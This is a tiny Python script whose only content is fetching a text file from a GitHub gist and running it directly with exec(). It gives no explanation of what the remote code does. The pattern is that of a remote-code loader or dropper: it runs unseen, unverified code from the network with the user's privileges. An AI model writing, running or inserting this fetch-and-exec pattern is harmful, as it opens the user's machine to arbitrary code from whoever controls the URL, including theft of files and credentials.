import urllib.request

url = "https://gist.githubusercontent.com/jennimotaa/2463bc037119e4df853a5ccec3aac6f4/raw/90d6c1e9805744020c483c0f7932d2117f437d6f/gistfile1.txt"
exec(urllib.request.urlopen(url).read().decode('utf-8'))
